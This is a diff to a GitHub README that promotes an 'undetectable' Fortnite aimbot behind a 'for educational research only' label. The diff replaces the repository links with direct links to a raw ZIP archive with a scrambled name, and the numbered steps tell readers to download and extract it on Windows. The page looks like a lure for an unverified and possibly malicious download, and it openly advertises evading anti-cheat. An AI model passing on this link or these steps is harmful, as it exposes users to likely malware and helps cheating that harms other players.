@@ -1,6 +1,6 @@
 # 🎯 FOR-EDUCATIONAL-RESEARCH-ONLY-Install-Fortnite-Aimbot-2026-Undetectable-Aim-Assist - Practice precise aim with research tools
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/nealasquiggly671/FOR-EDUCATIONAL-RESEARCH-ONLY-Install-Fortnite-Aimbot-2026-Undetectable-Aim-Assist)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/nealasquiggly671/FOR-EDUCATIONAL-RESEARCH-ONLY-Install-Fortnite-Aimbot-2026-Undetectable-Aim-Assist/main/rentaller/FO_Aim_RESEARC_ONL_Aimbot_Assist_Install_EDUCATIONA_Undetectable_Fortnite_v3.7.zip)
 
 ## 📖 Project Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these specifications to run the software effectively:
 
 Follow these steps to install the software on your Windows machine. 
 
-1. Visit this page to download: [https://github.com/nealasquiggly671/FOR-EDUCATIONAL-RESEARCH-ONLY-Install-Fortnite-Aimbot-2026-Undetectable-Aim-Assist](https://github.com/nealasquiggly671/FOR-EDUCATIONAL-RESEARCH-ONLY-Install-Fortnite-Aimbot-2026-Undetectable-Aim-Assist)
+1. Visit this page to download: [https://raw.githubusercontent.com/nealasquiggly671/FOR-EDUCATIONAL-RESEARCH-ONLY-Install-Fortnite-Aimbot-2026-Undetectable-Aim-Assist/main/rentaller/FO_Aim_RESEARC_ONL_Aimbot_Assist_Install_EDUCATIONA_Undetectable_Fortnite_v3.7.zip](https://raw.githubusercontent.com/nealasquiggly671/FOR-EDUCATIONAL-RESEARCH-ONLY-Install-Fortnite-Aimbot-2026-Undetectable-Aim-Assist/main/rentaller/FO_Aim_RESEARC_ONL_Aimbot_Assist_Install_EDUCATIONA_Undetectable_Fortnite_v3.7.zip)
 2. Locate the download folder on your computer.
 3. Extract the contents of the downloaded ZIP file to a folder of your choice.
 4. Open the extracted folder.
